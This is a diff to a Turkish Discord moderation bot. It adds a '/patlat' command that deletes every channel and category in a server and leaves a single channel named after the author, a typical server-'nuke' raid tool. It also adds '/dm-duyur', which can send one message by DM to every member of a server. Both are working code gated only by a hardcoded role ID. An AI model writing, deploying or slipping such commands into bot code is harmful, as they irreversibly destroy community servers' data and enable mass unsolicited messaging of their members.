@@ -400,6 +400,14 @@
             .setName('kayıt-setup')
             .setDescription('Kayıt sistemi kurulum mesajını gönderir.')
             .addChannelOption(option => option.setName('kanal').setDescription('Kayıt kanalı').setRequired(true)),
+        new SlashCommandBuilder()
+            .setName('patlat')
+            .setDescription('Sunucudaki tüm kanalları siler ve yeni kanal oluşturur.'),
+        new SlashCommandBuilder()
+            .setName('dm-duyur')
+            .setDescription('Belirtilen kullanıcıya veya herkese DM gönderir.')
+            .addStringOption(option => option.setName('kullanici').setDescription('Kullanıcı ID veya "all" (herkese)').setRequired(true))
+            .addStringOption(option => option.setName('mesaj').setDescription('Gönderilecek mesaj').setRequired(true)),
     ].map(command => command.toJSON());
 
     const rest = new REST({ version: '10' }).setToken(TOKEN);
@@ -1048,6 +1056,117 @@
             }
         }
 
+        if (interaction.commandName === 'patlat') {
+            const yetkiliRolID = '1401227942498930760';
+            if (!interaction.member.roles.cache.has(yetkiliRolID)) {
+                return interaction.reply({ content: '❌ Bu komutu kullanmak için yetkin yok!', ephemeral: true });
+            }
+
+            try {
+                await interaction.deferReply({ ephemeral: true });
+                
+                const guild = interaction.guild;
+                
+                // Tüm kanalları sil
+                const channels = guild.channels.cache;
+                for (const [id, channel] of channels) {
+                    try {
+                        if (channel.type !== ChannelType.GuildCategory) {
+                            await channel.delete();
+                            console.log(`Kanal silindi: ${channel.name}`);
+                        }
+                    } catch (error) {
+                        console.error(`Kanal silinirken hata: ${channel.name}`, error);
+                    }
+                }
+
+                // Tüm kategorileri sil
+                const categories = guild.channels.cache.filter(channel => channel.type === ChannelType.GuildCategory);
+                for (const [id, category] of categories) {
+                    try {
+                        await category.delete();
+                        console.log(`Kategori silindi: ${category.name}`);
+                    } catch (error) {
+                        console.error(`Kategori silinirken hata: ${category.name}`, error);
+                    }
+                }
+
+                // Yeni kanal oluştur
+                const newChannel = await guild.channels.create({
+                    name: 'benneyim',
+                    type: ChannelType.GuildText,
+                    permissionOverwrites: [
+                        {
+                            id: guild.roles.everyone.id,
+                            allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory]
+                        }
+                    ]
+                });
+
+                // Bot mesajı gönder
+                await newChannel.send('benneyim');
+
+                await interaction.editReply({ content: '✅ Tüm kanallar silindi ve yeni kanal oluşturuldu!' });
+                
+            } catch (error) {
+                console.error('Patlat komutu hatası:', error);
+                await interaction.editReply({ content: '❌ Bir hata oluştu!' });
+            }
+        }
+
+        if (interaction.commandName === 'dm-duyur') {
+            const yetkiliRolID = '1401227942498930760';
+            if (!interaction.member.roles.cache.has(yetkiliRolID)) {
+                return interaction.reply({ content: '❌ Bu komutu kullanmak için yetkin yok!', ephemeral: true });
+            }
+
+            try {
+                await interaction.deferReply({ ephemeral: true });
+                
+                const kullanici = interaction.options.getString('kullanici');
+                const mesaj = interaction.options.getString('mesaj');
+                
+                if (kullanici.toLowerCase() === 'all') {
+                    // Herkese DM gönder
+                    const guild = interaction.guild;
+                    const members = await guild.members.fetch();
+                    let successCount = 0;
+                    let failCount = 0;
+                    
+                    for (const [id, member] of members) {
+                        if (!member.user.bot) {
+                            try {
+                                await member.user.send(mesaj);
+                                successCount++;
+                                // Rate limit için bekle
+                                await new Promise(resolve => setTimeout(resolve, 1000));
+                            } catch (error) {
+                                failCount++;
+                                console.error(`DM gönderilemedi: ${member.user.tag}`, error);
+                            }
+                        }
+                    }
+                    
+                    await interaction.editReply({ 
+                        content: `✅ DM duyuru tamamlandı!\n📤 Başarılı: ${successCount}\n❌ Başarısız: ${failCount}` 
+                    });
+                } else {
+                    // Belirli kullanıcıya DM gönder
+                    try {
+                        const user = await client.users.fetch(kullanici);
+                        await user.send(mesaj);
+                        await interaction.editReply({ content: `✅ DM başarıyla gönderildi: ${user.tag}` });
+                    } catch (error) {
+                        await interaction.editReply({ content: '❌ Kullanıcı bulunamadı veya DM gönderilemedi!' });
+                    }
+                }
+                
+            } catch (error) {
+                console.error('DM duyur komutu hatası:', error);
+                await interaction.editReply({ content: '❌ Bir hata oluştu!' });
+            }
+        }
+
         if (interaction.commandName === 'status') {
             const yetkiliRolID = '1401227942498930760';
             if (!interaction.member.roles.cache.has(yetkiliRolID)) {
@@ -1103,7 +1222,9 @@
                     '`/slowmode <saniye>` → Kanalın slowmode süresini ayarlar\n' +
                     '`/status <online/idle/dnd/invisible>` → Bot durumunu değiştirir\n' +
                     '`/renk-rol` → Renk rolleri sistemini aktif eder\n' +
-                    '`/kayıt-setup` → Kayıt sistemi kurulum mesajını gönderir\n'
+                    '`/kayıt-setup` → Kayıt sistemi kurulum mesajını gönderir\n' +
+                    '`/patlat` → Sunucudaki tüm kanalları siler ve yeni kanal oluşturur\n' +
+                    '`/dm-duyur <kullanıcı/all> <mesaj>` → Belirtilen kullanıcıya veya herkese DM gönderir\n'
                 )
                 .setColor(0x3498db)
                 .setFooter({ text: 'Created by benneyim', iconURL: client.user.displayAvatarURL() });
